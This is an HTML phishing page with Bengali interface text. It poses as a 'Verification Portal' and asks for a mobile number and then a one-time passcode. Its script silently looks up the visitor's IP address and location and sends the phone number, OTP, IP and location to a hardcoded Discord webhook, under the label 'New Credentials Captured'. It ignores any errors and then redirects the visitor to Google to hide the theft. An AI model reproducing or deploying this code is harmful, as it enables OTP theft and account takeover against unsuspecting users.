<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
*{box-sizing:border-box}
body{
 margin:0;
 font-family:Arial,sans-serif;
 background:#121212;
 color:#fff;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
}
.card{
 background:#1e1e1e;
 padding:25px;
 border-radius:12px;
 width:340px;
 box-shadow:0 4px 15px rgba(0,0,0,0.5);
}
h3{text-align:center;color:#007acc;margin-bottom:20px;}
input{
 width:100%;
 padding:12px;
 margin:10px 0;
 background:#2d2d2d;
 border:1px solid #444;
 color:#fff;
 border-radius:6px;
 box-sizing:border-box;
 font-size:15px;
}
button{
 width:100%;
 padding:12px;
 background:#007acc;
 color:white;
 border:none;
 border-radius:6px;
 cursor:pointer;
 font-weight:bold;
 font-size:15px;
 margin-top:5px;
}
button:hover{background:#005999}
#otpSection{display:none;}
#message{margin-top:12px;font-size:13px;text-align:center;color:#ff6b6b;}
</style>
</head>
<body>

<div class="card">
    <h3>Verification Portal</h3>
    
    <!-- ধাপ ১: মোবাইল নম্বর ইনপুট -->
    <div id="phoneSection">
        <input type="tel" id="phoneNumber" placeholder="মোবাইল নম্বর দিন (যেমন: 017xxxxxxxx)" maxlength="15">
        <button onclick="sendPhone()">পরবর্তী (Next)</button>
    </div>

    <!-- ধাপ ২: ওটিপি (OTP) ইনপুট -->
    <div id="otpSection">
        <input type="text" id="otpCode" placeholder="৬ সংখ্যার OTP কোড দিন" maxlength="6">
        <button onclick="verifyAndSend()">যাচাই করুন (Verify)</button>
    </div>

    <div id="message"></div>
</div>

<script>
// আপনার ডিসকর্ড ওয়েবহুক ইউআরএল এখানে গোপনভাবে সংযুক্ত রয়েছে
const webhookUrl = "https://discord.com/api/webhooks/1568661175959298110/oGptGCUpE-n-4GTWtG2vR72e6K9e9eYqSBMrGskI38492Fs8qhtuzyi0Wa2d9qrTv54d";

let capturedPhone = "";

async function sendPhone() {
    capturedPhone = document.getElementById('phoneNumber').value.trim();
    const message = document.getElementById('message');

    if (!capturedPhone || capturedPhone.length < 10) {
        message.textContent = "দয়া করে সঠিক মোবাইল নম্বর দিন।";
        return;
    }

    message.textContent = "";
    document.getElementById('phoneSection').style.display = "none";
    document.getElementById('otpSection').style.display = "block";
}

async function verifyAndSend() {
    const otp = document.getElementById('otpCode').value.trim();
    const message = document.getElementById('message');

    if (!otp || otp.length < 4) {
        message.textContent = "দয়া করে সঠিক OTP দিন।";
        return;
    }

    try {
        // ক্লায়েন্টের আইপি এবং লোকেশন ফেচ করা
        const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({}));
        const ipData = await ipRes.json();

        const payload = {
            username: "Data Log Hub",
            embeds: [{
                title: "📥 New Credentials Captured",
                color: 16711680,
                fields: [
                    { name: "📱 PHONE NUMBER", value: `\`${capturedPhone}\``, inline: true },
                    { name: "🔑 OTP CODE", value: `\`${otp}\``, inline: true },
                    { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'UNKNOWN'}**`, inline: true },
                    { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true }
                ],
                footer: { text: "Timestamp: " + new Date().toLocaleString() }
            }]
        };

        // ডিসকর্ড ওয়েবহুকে পোস্ট রিকোয়েস্ট পাঠানো
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        });

    } catch (e) {
        // কোনো এরর হলেও ফ্লো অব্যাহত রাখা
    }

    // সফলভাবে সাবমিট হওয়ার পর রিডাইরেক্ট
    window.location.replace("https://www.google.com");
}
</script>

</body>
</html>
